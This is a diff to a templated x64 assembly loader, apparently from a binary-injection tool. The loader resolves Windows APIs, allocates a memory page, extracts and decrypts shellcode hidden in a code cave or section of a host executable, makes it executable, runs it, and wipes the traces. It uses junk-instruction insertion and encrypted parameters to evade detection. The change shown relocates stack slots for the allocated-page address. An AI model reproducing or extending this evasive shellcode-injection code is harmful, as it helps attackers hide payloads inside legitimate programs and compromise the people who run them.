@@ -4,12 +4,13 @@
 // rsi store address of kernel32.dll
 // rbx store address of LoadLibrary
 // rbp store address of GetProcAddress
-// [rsp+0x08] store address of allocated memory page
 // [rsp+0x10] store address of VirtualAlloc
 // [rsp+0x18] store address of VirtualFree
 // [rsp+0x20] store address of VirtualProtect
 // [rsp+0x28] store address of CreateThread
 // [rsp+0x30] store address of WaitForSingleObject
+// [rsp+0x38] store address of allocated memory page
+// [rsp+0x40] store the last error
 // 0x21082520 is a stub that will be replaced by injector
 
 entry:
@@ -22,7 +23,8 @@ entry:
   push rbp                                                     {{igi}}
 
   // reserve stack for store variables
-  sub rsp, 0x48                                                {{igi}}
+  sub rsp, 0x28                                                {{igi}}
+  sub rsp, 0x30                                                {{igi}}
 
 // =============================== get procedure address ===============================
 
@@ -278,7 +280,7 @@ entry:
   add rsp, 0x20                                {{igi}} // restore stack for call convention
 
   // store allocated memory address
-  mov [rsp+0x08], rax                          {{igi}}
+  mov [rsp+0x38], rax                          {{igi}}
 
   // padding garbage data to page
   mov {{.RegV.rdx}}, rax                       {{igi}}
@@ -309,7 +311,7 @@ entry:
   // extract encrypted shellcode from code cave
   push {{.RegN.rdi}}                           {{igi}} // save "rdi" for execute shellcode
   mov {{.RegN.rbx}}, {{hex .PayloadKey}}       {{igi}} // key of encrypted shellcode
-  mov {{.RegN.rdi}}, [rsp+0x10]                {{igi}} // address of allocated memory page
+  mov {{.RegN.rdi}}, [rsp+0x08+0x38]           {{igi}} // address of allocated memory page
   add {{.RegN.rdi}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
   {{STUB CodeCaveMode STUB}}
   pop {{.RegN.rdi}}                            {{igi}} // restore "rdi" for execute shellcode
@@ -323,7 +325,7 @@ entry:
   // extract encrypted shellcode from section
   mov rsi, {{.RegN.rdi}}                       {{igi}} // address of image base
   add rsi, {{hex .PayloadRVA}}                 {{igi}} // address of encrypted shellcode
-  mov rdi, [rsp+0x18]                          {{igi}} // address of allocated memory page
+  mov rdi, [rsp+0x10+0x38]                     {{igi}} // address of allocated memory page
   add rdi, {{hex .EntryOffset}}                {{igi}} // address of shellcode
   mov {{.RegV.rcx}}, {{hex .PayloadSize}}      {{igi}} // set loop times
  loop_extract:
@@ -335,7 +337,7 @@ entry:
 
   // decrypt shellcode in the memory page
   mov {{.RegV.rax}}, {{hex .PayloadKey}}       {{igi}} // key of encrypted shellcode
-  mov {{.RegV.rdx}}, [rsp+0x18]                {{igi}} // address of allocated memory page
+  mov {{.RegV.rdx}}, [rsp+0x10+0x38]           {{igi}} // address of allocated memory page
   add {{.RegV.rdx}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
   mov {{.RegV.rcx}}, {{hex .PayloadSize}}      {{igi}} // set loop times
  loop_decrypt:
@@ -358,7 +360,7 @@ entry:
 
   // adjust memory region protect before execute
   mov rax, [rsp+0x20]                          {{igi}} // address of VirtualProtect
-  mov rcx, [rsp+0x08]                          {{igi}} // lpAddress
+  mov rcx, [rsp+0x38]                          {{igi}} // lpAddress
   sub rsp, 0x08                                {{igi}} // for store old protect
   mov rdx, {{hex .MemRegionSize}}              {{igi}} // dwSize
   mov r8, {{hex .PAData.NewProtect}}           {{igi}} // flNewProtect
@@ -374,10 +376,10 @@ entry:
   {{if .NeedShellcodeJumper}}
     mov r10, {{.RegN.rdi}}                     {{igi}} // address of image base
     add r10, {{hex .JumperRVA}}                {{igi}} // address of shellcode jumper
-    mov r11, [rsp+0x08]                        {{igi}} // address of memory page
+    mov r11, [rsp+0x38]                        {{igi}} // address of memory page
     add r11, {{hex .EntryOffset}}              {{igi}} // address of shellcode
   {{else}}
-    mov r10, [rsp+0x08]                        {{igi}} // address of memory page
+    mov r10, [rsp+0x38]                        {{igi}} // address of memory page
     add r10, {{hex .EntryOffset}}              {{igi}} // address of shellcode
     xor r11d, r11d                             {{igi}} // clear register for lpParameter
   {{end}}
@@ -406,7 +408,7 @@ entry:
     add rsp, 0x20                              {{igi}} // restore stack for call convention
   {{end}}
 {{else}}
-  mov {{.RegV.rax}}, [rsp+0x08]                {{igi}} // address of allocated memory
+  mov {{.RegV.rax}}, [rsp+0x38]                {{igi}} // address of allocated memory
   add {{.RegV.rax}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
   sub rsp, 0x20                                {{igi}} // reserve stack for call convention
   call {{.RegV.rax}}                           {{igi}} // call shellcode
@@ -419,7 +421,7 @@ entry:
   {{if not .UseRWXPage}}
     // adjust memory region protect before erase
     mov rax, [rsp+0x20]                        {{igi}} // address of VirtualProtect
-    mov rcx, [rsp+0x08]                        {{igi}} // lpAddress
+    mov rcx, [rsp+0x38]                        {{igi}} // lpAddress
     sub rsp, 0x08                              {{igi}} // for store old protect
     mov rdx, {{hex .MemRegionSize}}            {{igi}} // dwSize
     mov r8, {{hex .PAData.Protect}}            {{igi}} // flNewProtect PAGE_READWRITE
@@ -433,7 +435,7 @@ entry:
   {{end}}
 
   // overwrite memory data
-  mov {{.RegV.rdx}}, [rsp+0x08]                {{igi}} // address of memory page
+  mov {{.RegV.rdx}}, [rsp+0x38]                {{igi}} // address of memory page
   add {{.RegV.rdx}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
   mov {{.RegV.rcx}}, {{hex .PayloadSize}}      {{igi}} // set loop times
   sub {{.RegV.rcx}}, 7                         {{igi}} // adjust loop times
@@ -459,7 +461,7 @@ entry:
 
   // release allocated memory page
   mov rax, [rsp+0x18]                          {{igi}} // address of VirtualFree
-  mov rcx, [rsp+0x08]                          {{igi}} // address of allocated memory
+  mov rcx, [rsp+0x38]                          {{igi}} // address of allocated memory
   xor edx, edx                                 {{igi}} // dwSize
   mov r8, {{hex .PAData.FreeType}}             {{igi}} // dwFreeType MEM_RELEASE
   mov r9, {{hex .PAKey.FreeType}}              {{igi}} // set decrypt key
@@ -478,15 +480,17 @@ entry:
   xor {{.RegN.ebp}}, {{.RegN.ebp}}                             {{igi}}
 
   // clear stack that store sensitive data
-  mov [rsp+0x08], {{.RegN.rdi}}                                {{igi}}
   mov [rsp+0x10], {{.RegN.rsi}}                                {{igi}}
   mov [rsp+0x18], {{.RegN.rbx}}                                {{igi}}
   mov [rsp+0x20], {{.RegN.rbp}}                                {{igi}}
   mov [rsp+0x28], {{.RegN.rdi}}                                {{igi}}
   mov [rsp+0x30], {{.RegN.rsi}}                                {{igi}}
+  mov [rsp+0x38], {{.RegN.rdi}}                                {{igi}}
+  mov [rsp+0x40], {{.RegN.rbx}}                                {{igi}}
 
   // restore stack for store variables
-  add rsp, 0x48                                                {{igi}}
+  add rsp, 0x30                                                {{igi}}
+  add rsp, 0x28                                                {{igi}}
 
   // restore stack and rbp
   pop rbp                                                      {{igi}}
